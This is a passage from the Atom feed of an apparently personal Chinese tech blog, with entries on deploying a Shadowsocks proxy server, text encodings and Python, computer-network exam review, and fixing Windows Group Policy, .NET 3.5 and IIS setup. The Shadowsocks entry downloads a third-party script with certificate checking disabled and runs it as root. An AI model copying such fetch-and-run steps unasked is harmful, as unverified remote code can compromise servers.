    <content type="html"><![CDATA[<p>1.下载Putty<br>2.填写Host Name<br>3.输入root<br>4.输入服务器密码<br>5.执行命令</p><pre><code>wget –no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.shchmod +x shadowsocks.sh./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</code></pre><p>6.设置SS密码和端口号，选择加密方式7<br>7.按任意键等待部署</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.下载Putty&lt;br&gt;2.填写Host Name&lt;br&gt;3.输入root&lt;br&gt;4.输入服务器密码&lt;br&gt;5.执行命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget –no-check-certificate -O shadowsocks.sh https://raw.git
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>编码问题</title>
    <link href="http://yoursite.com/2018/08/06/%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/08/06/编码问题/</id>
    <published>2018-08-06T07:15:28.730Z</published>
    <updated>2018-08-06T07:33:46.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h1><p>汉字编码：<br>/GBK2312：简体字集<br>/GBK：简繁字集<br>/GBK18030：汉字集标准<br>/BIG5：台湾繁体字集     </p><h1 id="ASCII–-gt-UTF—-gt-UTF-8"><a href="#ASCII–-gt-UTF—-gt-UTF-8" class="headerlink" title="ASCII–&gt;UTF—&gt;UTF-8"></a>ASCII–&gt;UTF—&gt;UTF-8</h1><p>ASCII 一个字节(b7奇偶校验位) 一般用来表示127个字符（A-Z,a-z）<br>Unicode 两个字节<br><strong>UTF-8可变长编码</strong> （英文字母1个字节，汉字通常3个字节）<br>(UTF-8是Unicode的一种实现)    </p><p>UTF-16两个字节为编码单元    </p><p>UTF-8<-->GBK 通过Unicode实现    </--></p><p>记事本（Unicode）—-&gt;文件(UTF-8)<br>服务器（Unicode）—-&gt;浏览器(UTF-8网页)    </p><h1 id="ANSI编码"><a href="#ANSI编码" class="headerlink" title="ANSI编码"></a>ANSI编码</h1><p>简体中文操作系统 ANSI代表GB2312编码（2个字节）     </p><h1 id="关于Python中的编码问题"><a href="#关于Python中的编码问题" class="headerlink" title="关于Python中的编码问题"></a>关于Python中的编码问题</h1><p>1.字符串str内存中Unicode表示，网络传输字符串str转化为字节流bytes。<br>2.Unicode表示的str—-&gt;encode—&gt;bytes（含中文用UTF-8编码）<br>3.bytes—&gt;decode—&gt;str<br>4.常用UTF-8编码进行转换。<br>5.有非法问题可用decode(‘gbk’, ‘ignore’)      </p><h1 id="文本保存"><a href="#文本保存" class="headerlink" title="文本保存"></a>文本保存</h1><p>BOM:Byte Order Mark<br>保存常用UTF-8无BOM格式编码     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;常用编码&quot;&gt;&lt;a href=&quot;#常用编码&quot; class=&quot;headerlink&quot; title=&quot;常用编码&quot;&gt;&lt;/a&gt;常用编码&lt;/h1&gt;&lt;p&gt;汉字编码：&lt;br&gt;/GBK2312：简体字集&lt;br&gt;/GBK：简繁字集&lt;br&gt;/GBK18030：汉字集标准&lt;br&gt;/BIG
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>计算机网络复习</title>
    <link href="http://yoursite.com/2018/07/09/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/07/09/计网复习/</id>
    <published>2018-07-09T07:50:53.316Z</published>
    <updated>2018-10-20T01:27:05.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="重点勾勒"><a href="#重点勾勒" class="headerlink" title="重点勾勒"></a>重点勾勒</h1><p>电路交换，报文交换，分组交换特点<br>计网性能指标<br>协议三要素<br>OSI，ＴＣＰ／ＩＰ，五层协议　分层比较与记忆<br>常用编码方式和基本的带通调制方式<br>信道复用技术：频分时分码分波分<br>数据链路层三个基本问题：封装成帧，透明传输，差错检验<br>差错检验：循环冗余校验<br>集线器，交换机和网桥工作原理和特点比较<br>使用以太网交换机进行 VLAN 的扩充<br>3.07 3.30 3.31<br>4.20 4.21 4.26 4.27 4.30 4.37 4.42 4.43<br>5.09 5.23 5.31 5.34 </p><p>5<br>/.47<br>DNS FTP/TFTP比较 URL，HTML    </p><p>第一部分1.2.3章<br>选择10，论述2，计算2<br>第二部分1.6章<br>选择5，论述2，分析1<br>第三部分4.5章<br>分析2，计算2，综合2</p><h1 id="重点扩充"><a href="#重点扩充" class="headerlink" title="重点扩充"></a>重点扩充</h1><h2 id="第一章概述"><a href="#第一章概述" class="headerlink" title="第一章概述"></a>第一章概述</h2><p>1.电路交换、报文交换、分组交换区别<br>2.OSI七层协议 TCP/IP四层协议 五层协议 以及他们的作用    </p><h2 id="第二章物理层"><a href="#第二章物理层" class="headerlink" title="第二章物理层"></a>第二章物理层</h2><p>1.物理层传输媒体：导引型传输媒体和非导引型传输媒体<br>2.信道复用技术：频分复用，时分复用，统计时分复用，波分复用，码分复用。     </p><h2 id="第三章数据链路层"><a href="#第三章数据链路层" class="headerlink" title="第三章数据链路层"></a>第三章数据链路层</h2><p>1.三个基本问题：封装成帧、透明传输、差错检测。<br>2.以太网的MAC帧封装格式<br>3.扩展以太网，网络设备在不同层所完成的功能<br>4.虚拟局域网的概念以及作用  </p><h2 id="第四章网络层"><a href="#第四章网络层" class="headerlink" title="第四章网络层"></a>第四章网络层</h2><p>1.IP地址的分类<br>2.ARP作用<br>3.子网的划分(划分相同子网和不同子网)，子网掩码<br>4.ICMP作用<br>5.RIP和OSPF概念以及作用<br>6.路由转发（路由表选择的转发条目）   </p><h2 id="第五章运输层"><a href="#第五章运输层" class="headerlink" title="第五章运输层"></a>第五章运输层</h2><p>1.运输层端口的作用以及分类<br>2.UDP与TCP区别<br>3.TCP可靠传输（三次握手过程）<br>4.TCP拥塞控制（四个算法的应用）</p><h2 id="第六章应用层"><a href="#第六章应用层" class="headerlink" title="第六章应用层"></a>第六章应用层</h2><p>1.域名结构，域名服务器的分类，高速缓存的作用<br>2.FTP传输的基本工作过程，TFTP相比FTP的改进<br>3.万维网解决的4个问题<br>4.SMTP工作的三个阶段以及工作过程</p><h1 id="计算机网络概论"><a href="#计算机网络概论" class="headerlink" title="计算机网络概论"></a>计算机网络概论</h1><p>1.电路交换：面向连接的。分为三个阶段，建立连接、通信、释放连接。比特流直达终点。</p><p>3.报文交换：报文传送到相邻结点，全部存储下来查找转发表，转发到一个结点。</p><p>2.分组交换：采用存储转发技术，在发送端，把较长的报文划分成较短的、固定长度的数据段，以分组作为数据传输单元。</p><p>4.计算机网络的性能指标：速率、带宽、吞吐率、时延、时延带宽积、往返时间RTT、利用率</p><ul><li>速率：数据的传送速率（额定速率或标称速率），bit/s      </li><li>带宽：1.信号的<strong>频带宽度</strong>，HZ 2.计算机网路中指单位时间内网络某信道通过的“<strong>最高数据率</strong>”，bit/s</li><li>吞吐量：单位时间内通过某个网络的数据量</li><li>时延：<br>发送时延= 数据帧长度(bit)/发送速率(bit/s)<br>传播时延= 信道长度（m）/信号在信道上的传播速率(m/s)<br>总时延= 发送+传播+处理+排队 时延<br>高速网络链路提高的是数据的发送速率而非bit在链路的传播速率</li><li>时延带宽积：传播时延(s)*带宽(bit/s)</li><li>往返时间RTT: 发送方发送到收到接收方确认经历的时间</li><li>利用率:信道利用率和网络利用率。信道利用率增大时会引起时延增加<br>D = Do/1-U  网络当前时延=网络空闲时延/1-网络利用率</li></ul><p>5.网络协议三要素：</p><ul><li>语法:数据与控制信息的结构或格式</li><li>语义：需要发出何种控制信息，完成何种动作以及做出何种响应</li><li>同步：事件实现顺序的详细说明     </li></ul><p>6.OSI TCP/IP 五层协议体系结构<br><img src="https://i.imgur.com/1Ts7Fny.png" alt=""></p><h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><p>1.常用的编码方式：</p><ul><li>不归零制：正电平1负电平0    </li><li>归零制：正脉冲1负脉冲0    </li><li>曼切斯特编码：位周期中心向上跳0，向下跳1   </li><li>差分曼切斯特编码:每一位中心始终有跳变。位开始边界有跳变0，，没有跳变1.<br>曼切斯特和差分曼切斯特编码具有自同步能力                   </li></ul><p>2.基本的带通调制     </p><ul><li>调幅：载波振幅随基带数字信号变化   </li><li>调频：    <em>频率</em>      </li><li>调相       <em>初始相位</em>     </li></ul><p>3.信道复用技术<br>信噪比(db)=10log10(S/N)  S:信号平均功率 N:噪声平均功率<br>香农公式 C=Wlog2(1+S/N) W:信道带宽<br>当信噪比和码元船速速率达上限，可用编码方法让每一个<strong>码元携带更多比特信息量</strong>。</p><h1 id="学习积累"><a href="#学习积累" class="headerlink" title="学习积累"></a>学习积累</h1><p>DHCP： 局域网中的协议，给内部网络自动分配IP地址。UDP协议工作。动态分配，DHCP client有需求就分配，关闭之后DHCP server收回。</p><p><img src="https://i.imgur.com/hAf14n6.jpg" alt=""><br><img src="https://i.imgur.com/VaxphHD.jpg" alt=""><br><img src="https://i.imgur.com/MPpDtzv.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;重点勾勒&quot;&gt;&lt;a href=&quot;#重点勾勒&quot; class=&quot;headerlink&quot; title=&quot;重点勾勒&quot;&gt;&lt;/a&gt;重点勾勒&lt;/h1&gt;&lt;p&gt;电路交换，报文交换，分组交换特点&lt;br&gt;计网性能指标&lt;br&gt;协议三要素&lt;br&gt;OSI，ＴＣＰ／ＩＰ，五层协议　分层比较与记忆
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WindowsIIS服务问题解决（0x800F081F）</title>
    <link href="http://yoursite.com/2018/07/08/IIS/"/>
    <id>http://yoursite.com/2018/07/08/IIS/</id>
    <published>2018-07-08T01:55:28.846Z</published>
    <updated>2018-07-08T15:07:32.444Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows家庭版添加组策略"><a href="#Windows家庭版添加组策略" class="headerlink" title="Windows家庭版添加组策略"></a>Windows家庭版添加组策略</h1><p>新建文本文档输入<br>    　@echo off</p><pre><code>pushd &quot;%~dp0&quot;dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txtdir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txtfor /f %%i in (&#39;findstr /i . List.txt 2^&gt;nul&#39;) do dism /online /norestart /add-package:&quot;C:\Windows\servicing\Packages\%%i&quot;pause另存为所有文件，文件名为.cmd,右键管理员运行。</code></pre><p>用小娜输入gpedit.msc打开组策略管理器</p><h1 id="修改组策略"><a href="#修改组策略" class="headerlink" title="修改组策略"></a>修改组策略</h1><p>首先在微软官网下载镜像文件，制作U盘，然后在U盘下的sources\sxs文件实现.Net FrameWork的重新安装。</p><p>找到计算机配置—-管理摸板—系统—-指定可选组件安装和组件修复的设置—编辑设置已启用，选择直接从Windows更新。确定应用，然后在WindowsPowerShell管理员模式下运行</p><pre><code>Dism /online /enable-feature /featurename:NetFx3 /All /Source:&lt;drive&gt;:\sources\sxs /LimitAccess</code></pre><p>例如J盘</p><pre><code>Dism /online /enable-feature /featurename:NetFx3 /All /Source:D:\sources\sxs /LimitAccess</code></pre><p>踩过坑之后网上方法试遍最后解决问题。学海无涯啊</p><h1 id="IIS配置WebServer"><a href="#IIS配置WebServer" class="headerlink" title="IIS配置WebServer"></a>IIS配置WebServer</h1><p>之前配置过Apache服务器，故经过一番探索，有冲突，需先关闭Apache服务器才能进行IIS的配置      </p><p>首先在服务中启动万维网服务     </p><p>winserver中的iis中启动网站提示：<br>万维网发布服务(W3SVC)均处于运行状态，否则无法启动网站        </p><p>在WINDOWS服务管理里 启动 <code>World Wide Web Publishing Service</code>即可</p><p>管理员模式下命令行<br>切换到Apache24\bin目录下执行<code>httpd -k stop</code><br>关闭Apache24服务    </p><p>ps:<br>Apache其他命令<br>    安装Apache         httpd -k install<br>    关闭Apache        httpd -k stop<br>    重启Apache        httpd -k restart<br>    卸载Apache        httpd -k uninstall<br>    查看Apache版本     httpd -V<br>    命令帮助           httpd -h</p><p>接着打开IIS服务管理器方可启动默认站点    </p><p>启动万维网服务<br>修改IP和物理路径和端口号<br>启动站点<br>输入<code>http://ip:port</code>即可打开</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Windows家庭版添加组策略&quot;&gt;&lt;a href=&quot;#Windows家庭版添加组策略&quot; class=&quot;headerlink&quot; title=&quot;Windows家庭版添加组策略&quot;&gt;&lt;/a&gt;Windows家庭版添加组策略&lt;/h1&gt;&lt;p&gt;新建文本文档输入&lt;br&gt;    　@
      
    
    </summary>
    
    
  </entry>
  
</feed>
